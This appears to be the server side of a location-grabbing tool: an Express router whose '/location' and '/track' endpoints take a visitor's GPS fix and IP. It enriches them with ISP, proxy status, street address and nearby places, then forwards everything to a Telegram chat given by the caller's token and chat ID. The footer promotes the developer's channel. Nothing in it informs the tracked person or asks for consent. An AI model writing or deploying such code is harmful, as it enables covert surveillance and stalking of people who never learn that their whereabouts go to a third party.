const express = require('express');
const router = express.Router();
const TelegramBot = require('./telegram');
const geoip = require('geoip-lite');
const fetch = require('node-fetch');

// Get precise location from IP using multiple services
async function getLocationFromIP(ip) {
    const geoData = geoip.lookup(ip);
    
    if (geoData && geoData.ll && geoData.ll[0] && geoData.ll[1]) {
        return {
            latitude: geoData.ll[0],
            longitude: geoData.ll[1],
            accuracy: 'medium',
            source: 'geoip',
            country: geoData.country,
            region: geoData.region,
            city: geoData.city,
            timezone: geoData.timezone
        };
    }
    
    // Fallback to ip-api.com
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`);
        const data = await response.json();
        
        if (data.status === 'success') {
            return {
                latitude: data.lat,
                longitude: data.lon,
                accuracy: 'high',
                source: 'ip-api',
                country: data.country,
                region: data.regionName,
                city: data.city,
                timezone: data.timezone,
                isp: data.isp,
                org: data.org,
                isMobile: data.mobile,
                isProxy: data.proxy,
                isHosting: data.hosting
            };
        }
    } catch (e) {
        console.error('IP-API fallback error:', e);
    }
    
    // Second fallback to ipinfo.io
    try {
        const response = await fetch(`https://ipinfo.io/${ip}/json`);
        const data = await response.json();
        
        if (data.loc) {
            const [lat, lon] = data.loc.split(',');
            return {
                latitude: parseFloat(lat),
                longitude: parseFloat(lon),
                accuracy: 'high',
                source: 'ipinfo',
                country: data.country,
                region: data.region,
                city: data.city,
                timezone: data.timezone,
                org: data.org,
                postal: data.postal
            };
        }
    } catch (e) {
        console.error('IPInfo fallback error:', e);
    }
    
    return null;
}

// Get address from coordinates using reverse geocoding
async function reverseGeocode(lat, lon) {
    try {
        const response = await fetch(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`,
            {
                headers: {
                    'User-Agent': 'LocationService/1.0',
                    'Accept-Language': 'en'
                }
            }
        );
        
        const data = await response.json();
        
        if (data && data.address) {
            return {
                displayName: data.display_name,
                address: {
                    road: data.address.road || '',
                    suburb: data.address.suburb || '',
                    city: data.address.city || data.address.town || data.address.village || '',
                    state: data.address.state || '',
                    postcode: data.address.postcode || '',
                    country: data.address.country || '',
                    countryCode: data.address.country_code || ''
                },
                osmId: data.osm_id,
                category: data.category,
                type: data.type
            };
        }
    } catch (e) {
        console.error('Reverse geocode error:', e);
    }
    
    return null;
}

// Get nearby places of interest
async function getNearbyPlaces(lat, lon) {
    try {
        const radius = 1000; // 1km radius
        const response = await fetch(
            `https://overpass-api.de/api/interpreter?data=[out:json];(node(around:${radius},${lat},${lon})[amenity];);out;`,
            {
                headers: {
                    'User-Agent': 'LocationService/1.0'
                }
            }
        );
        
        const data = await response.json();
        
        if (data && data.elements) {
            const places = data.elements
                .filter(el => el.tags && el.tags.name)
                .slice(0, 10)
                .map(el => ({
                    name: el.tags.name,
                    type: el.tags.amenity || 'unknown',
                    lat: el.lat,
                    lon: el.lon
                }));
            
            return places;
        }
    } catch (e) {
        console.error('Nearby places error:', e);
    }
    
    return [];
}

// Generate Google Maps link
function generateMapsLink(lat, lon, type = 'google') {
    if (type === 'google') {
        return `https://www.google.com/maps?q=${lat},${lon}`;
    } else if (type === 'apple') {
        return `https://maps.apple.com/?q=${lat},${lon}`;
    } else if (type === 'waze') {
        return `https://www.waze.com/ul?ll=${lat},${lon}&navigate=yes`;
    } else if (type === 'osm') {
        return `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=18`;
    }
    return `https://www.google.com/maps?q=${lat},${lon}`;
}

// Calculate distance between two coordinates
function calculateDistance(lat1, lon1, lat2, lon2) {
    const R = 6371; // Earth's radius in km
    const dLat = (lat2 - lat1) * Math.PI / 180;
    const dLon = (lon2 - lon1) * Math.PI / 180;
    const a = 
        Math.sin(dLat/2) * Math.sin(dLat/2) +
        Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * 
        Math.sin(dLon/2) * Math.sin(dLon/2);
    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
    return R * c;
}

// Main location endpoint
router.post('/location', async (req, res) => {
    try {
        const { token, chatid, latitude, longitude, accuracy, altitude, speed, heading, timestamp } = req.body;
        
        if (!token || !chatid) {
            return res.status(400).json({ error: 'Token and ChatID required' });
        }
        
        const bot = new TelegramBot(token, chatid);
        const clientIP = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                        req.headers['x-real-ip'] || 
                        req.connection.remoteAddress;
        
        const now = new Date();
        const dateTime = now.toLocaleString('en-BD', {
            timeZone: 'Asia/Dhaka',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: true
        });
        
        // Get IP-based location
        const ipLocation = await getLocationFromIP(clientIP);
        
        // Build location message
        let locationMessage = `📍 <b>LIVE LOCATION UPDATE</b>\n`;
        locationMessage += `━━━━━━━━━━━━━━━━━━━━━\n`;
        locationMessage += `🕐 <b>Time:</b> ${dateTime}\n`;
        locationMessage += `🌐 <b>IP:</b> ${clientIP}\n\n`;
        
        // GPS Location
        if (latitude && longitude) {
            locationMessage += `🛰 <b>GPS COORDINATES</b>\n`;
            locationMessage += `━━━━━━━━━━━━━━━━━━━━━\n`;
            locationMessage += `🌍 <b>Latitude:</b> ${latitude}\n`;
            locationMessage += `🌍 <b>Longitude:</b> ${longitude}\n`;
            
            if (accuracy) locationMessage += `🎯 <b>Accuracy:</b> ${accuracy} meters\n`;
            if (altitude) locationMessage += `⛰ <b>Altitude:</b> ${altitude} meters\n`;
            if (speed) locationMessage += `🚀 <b>Speed:</b> ${speed} m/s\n`;
            if (heading) locationMessage += `🧭 <b>Heading:</b> ${heading}°\n`;
            
            // Get address from coordinates
            const address = await reverseGeocode(latitude, longitude);
            if (address) {
                locationMessage += `\n📍 <b>ADDRESS</b>\n`;
                locationMessage += `━━━━━━━━━━━━━━━━━━━━━\n`;
                locationMessage += `${address.displayName}\n`;
            }
            
            // Generate maps links
            locationMessage += `\n🗺 <b>MAPS LINKS</b>\n`;
            locationMessage += `━━━━━━━━━━━━━━━━━━━━━\n`;
            locationMessage += `<a href="${generateMapsLink(latitude, longitude, 'google')}">Google Maps</a>\n`;
            locationMessage += `<a href="${generateMapsLink(latitude, longitude, 'apple')}">Apple Maps</a>\n`;
            locationMessage += `<a href="${generateMapsLink(latitude, longitude, 'waze')}">Waze</a>\n`;
            locationMessage += `<a href="${generateMapsLink(latitude, longitude, 'osm')}">OpenStreetMap</a>\n`;
            
            // Get nearby places
            const nearbyPlaces = await getNearbyPlaces(latitude, longitude);
            if (nearbyPlaces.length > 0) {
                locationMessage += `\n🏪 <b>NEARBY PLACES</b>\n`;
                locationMessage += `━━━━━━━━━━━━━━━━━━━━━\n`;
                nearbyPlaces.forEach((place, index) => {
                    locationMessage += `${index + 1}. ${place.name} (${place.type})\n`;
                });
            }
            
            // Send live location to Telegram
            await bot.sendLocation(latitude, longitude, 
                `📍 Live Location\n🕐 ${dateTime}\n🎯 Accuracy: ${accuracy || 'N/A'}m`
            );
        }
        
        // IP-based location
        if (ipLocation) {
            locationMessage += `\n🌐 <b>IP-BASED LOCATION</b>\n`;
            locationMessage += `━━━━━━━━━━━━━━━━━━━━━\n`;
            locationMessage += `📍 <b>City:</b> ${ipLocation.city || 'Unknown'}\n`;
            locationMessage += `🏛 <b>Region:</b> ${ipLocation.region || 'Unknown'}\n`;
            locationMessage += `🌍 <b>Country:</b> ${ipLocation.country || 'Unknown'}\n`;
            locationMessage += `🕐 <b>Timezone:</b> ${ipLocation.timezone || 'Unknown'}\n`;
            locationMessage += `📡 <b>ISP:</b> ${ipLocation.isp || 'Unknown'}\n`;
            locationMessage += `🏢 <b>Organization:</b> ${ipLocation.org || 'Unknown'}\n`;
            
            if (ipLocation.isMobile) locationMessage += `📱 <b>Mobile Network:</b> Yes\n`;
            if (ipLocation.isProxy) locationMessage += `🔄 <b>Proxy/VPN:</b> Detected\n`;
            if (ipLocation.isHosting) locationMessage += `🖥 <b>Hosting/Data Center:</b> Yes\n`;
            
            // Calculate distance between GPS and IP location if both available
            if (latitude && longitude && ipLocation.latitude && ipLocation.longitude) {
                const distance = calculateDistance(
                    latitude, longitude,
                    ipLocation.latitude, ipLocation.longitude
                );
                locationMessage += `\n📏 <b>GPS-IP Distance:</b> ${distance.toFixed(2)} km\n`;
            }
        }
        
        locationMessage += `\n━━━━━━━━━━━━━━━━━━━━━\n`;
        locationMessage += `📢 Subscribe @CodeDevZeron\n`;
        locationMessage += `👨‍💻 Developer @DevZeron`;
        
        // Send location info message
        await bot.sendMessage(locationMessage);
        
        // Send IP location separately if different from GPS
        if (ipLocation && ipLocation.latitude && ipLocation.longitude) {
            if (!latitude || !longitude || 
                calculateDistance(latitude, longitude, ipLocation.latitude, ipLocation.longitude) > 1) {
                await bot.sendLocation(ipLocation.latitude, ipLocation.longitude,
                    `🌐 IP-Based Location\n🕐 ${dateTime}\n📍 ${ipLocation.city || 'Unknown'}, ${ipLocation.country || 'Unknown'}`
                );
            }
        }
        
        res.json({
            success: true,
            message: 'Location data processed successfully',
            timestamp: dateTime,
            gps: { latitude, longitude },
            ipLocation: ipLocation
        });
        
    } catch (error) {
        console.error('Location error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Get IP location only
router.get('/ip-location', async (req, res) => {
    try {
        const clientIP = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                        req.headers['x-real-ip'] || 
                        req.connection.remoteAddress;
        
        const location = await getLocationFromIP(clientIP);
        
        res.json({
            success: true,
            ip: clientIP,
            location: location
        });
        
    } catch (error) {
        console.error('IP location error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Continuous location tracking endpoint
router.post('/track', async (req, res) => {
    try {
        const { token, chatid, latitude, longitude, accuracy, speed, heading } = req.body;
        
        if (!token || !chatid) {
            return res.status(400).json({ error: 'Token and ChatID required' });
        }
        
        const bot = new TelegramBot(token, chatid);
        const now = new Date();
        const dateTime = now.toLocaleString('en-BD', {
            timeZone: 'Asia/Dhaka',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: true
        });
        
        if (latitude && longitude) {
            // Send live location with 1 hour live period
            await bot.sendLocation(latitude, longitude, 
                `🔴 Live Tracking\n🕐 ${dateTime}\n🚀 Speed: ${speed || 'N/A'} m/s\n🎯 Accuracy: ${accuracy || 'N/A'}m`
            );
            
            // Send movement details
            let trackMessage = `🔴 <b>LIVE TRACKING UPDATE</b>\n`;
            trackMessage += `━━━━━━━━━━━━━━━━━━━━━\n`;
            trackMessage += `🕐 ${dateTime}\n`;
            trackMessage += `📍 ${latitude}, ${longitude}\n`;
            if (speed) trackMessage += `🚀 Speed: ${speed} m/s\n`;
            if (heading) trackMessage += `🧭 Heading: ${heading}°\n`;
            if (accuracy) trackMessage += `🎯 Accuracy: ${accuracy}m\n`;
            
            await bot.sendMessage(trackMessage);
        }
        
        res.json({ success: true, timestamp: dateTime });
        
    } catch (error) {
        console.error('Track error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

module.exports = router;
